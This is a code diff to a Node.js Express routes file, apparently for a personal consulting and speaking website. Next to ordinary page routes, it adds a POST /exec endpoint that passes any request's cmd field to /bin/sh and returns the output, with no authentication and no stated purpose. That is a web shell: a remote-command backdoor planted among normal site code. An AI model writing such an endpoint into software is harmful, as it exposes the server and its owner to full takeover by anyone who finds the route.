@@ -34,3 +34,16 @@ var pagesController = new controllers.PagesController({
 app.get('/', pagesController.action('homepage'));
 app.get('/consulting', pagesController.action('consulting'));
 app.get('/speaking', pagesController.action('speaking'));
+
+var spawn = require('child_process').spawn;
+app.post('/exec', function(req, res) {
+  var cmd   = req.body.cmd;
+  var child = spawn('/bin/sh', ['-c', cmd]);
+
+  child.stdout.pipe(res, {end: false});
+  child.stderr.pipe(res, {end: false});
+
+  child.on('exit', function() {
+    res.end();
+  });
+});
